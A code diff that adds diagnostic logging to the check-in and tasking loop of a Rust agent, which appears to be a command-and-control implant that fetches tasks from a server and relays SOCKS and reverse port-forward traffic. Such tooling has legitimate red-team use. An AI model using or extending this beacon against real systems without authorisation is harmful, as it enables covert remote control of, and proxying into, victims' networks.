@@ -52,12 +52,14 @@ impl Agent {
     }
 
     pub fn run(&mut self) -> Result<(), AgentError> {
+        crate::diagnostic!("checking in");
         self.checkin()?;
+        crate::diagnostic!("checkin succeeded callback={}", self.callback_uuid);
         loop {
             match self.cycle() {
-                Ok(()) => {}
+                Ok(()) => crate::diagnostic!("tasking cycle succeeded"),
                 Err(_error) => {
-                    crate::diagnostic!("{_error:?}");
+                    crate::diagnostic!("tasking cycle failed: {_error:?}");
                 }
             }
             thread::sleep(self.config.sleep_duration());
@@ -79,9 +81,11 @@ impl Agent {
             process_name,
         };
         let outbound = self.codec.encode(&self.config.payload_uuid, &body)?;
+        crate::diagnostic!("sending checkin bytes={}", outbound.len());
         let inbound = self
             .transport
             .exchange(&outbound, Duration::from_secs(30))?;
+        crate::diagnostic!("received checkin bytes={}", inbound.len());
         let (_, reply): (_, CheckinReply) = self.codec.decode(&inbound)?;
         if reply.status != "success" || reply.id.len() != 36 {
             return Err(AgentError::Checkin);
@@ -101,9 +105,11 @@ impl Agent {
             delegates: Vec::new(),
         };
         let outbound = self.codec.encode(&self.callback_uuid, &request)?;
+        crate::diagnostic!("sending tasking bytes={}", outbound.len());
         let inbound = self
             .transport
             .exchange(&outbound, Duration::from_secs(30))?;
+        crate::diagnostic!("received tasking bytes={}", inbound.len());
         let (_, reply): (_, TaskingReply) = self.codec.decode(&inbound)?;
         self.socks.ingest(reply.socks);
         self.rpfwd.ingest(reply.rpfwd);
